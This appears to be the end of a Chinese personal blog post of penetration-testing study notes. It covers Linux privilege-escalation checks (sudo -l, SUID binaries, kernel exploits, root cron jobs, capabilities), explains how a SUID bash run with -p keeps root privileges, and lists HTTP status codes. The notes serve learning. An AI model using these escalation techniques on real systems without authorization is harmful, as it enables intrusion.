+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sudo滥用：当前用户是否可用免密执行某些高权限命令（sudo -l）</span><br><span class="line">SUID：系统中是否有设置了SUID为异常程序</span><br><span class="line">内核泄露：操作系统内核版本是否存在已知提权漏洞</span><br><span class="line">定时任务（cron）：是否有以root身份运行的cron job可以被篡改</span><br><span class="line">能力：是否有应有被赋予了ep权限</span><br><span class="line"></span><br><span class="line">SUID：正常情况下：运行一个程序时，是以用户的身份执行，但是某个程序设置了SUID，那么无论谁去运行它，它都会以文件所有者的身份去执行，如果文件所有者root，那这个程序就以root执行去运行，这也是提权的关键突破口。</span><br><span class="line">/user/bin/passwd就是一个正常的SUID程序，普通用户像需要修改密码，但是密码文件/etc/shadow只有root可写，所以这个passwd被设为SUID，它让普通用户改密码时也能以root身份写入密码</span><br><span class="line"></span><br><span class="line">正常情况下，即使bash被设置了suid，bash出于安全考虑，启动时会被有效用户ID</span><br><span class="line">（euid）降回真实用户ID（uid），主动放弃root权限，但加上-P参数后，bash会保留EUID=0（root）让攻击者-root身份执行命令</span><br><span class="line">-p 保留特权模式，不丢失SUID带来的euid=0</span><br></pre></td></tr></table></figure>
+
+<p>状态码含义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 200：存在，请求成功可以直接访问</span><br><span class="line">- 301：（目录/文件夹）永久重定向。网址永久换地址，浏览器会记住新地址</span><br><span class="line">- 302：临时重定向，页面跳转。只是这一次访问临时跳转到别的页面，浏览器不会记住新地址</span><br><span class="line">- 401：没登陆，需要认证</span><br><span class="line">- 402：保留状态码</span><br><span class="line">- 403：存在但是禁止访问。服务器收到了你的请求，但是拒绝给你访问权限</span><br><span class="line">- 500：服务器内部错误。网站代码、后端程序出错</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B02/" rel="prev" title="渗透测试笔记2">
+                  <i class="fa fa-angle-left"></i> 渗透测试笔记2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/15/%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/" rel="next" title="网络笔记">
+                  网络笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xzt</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
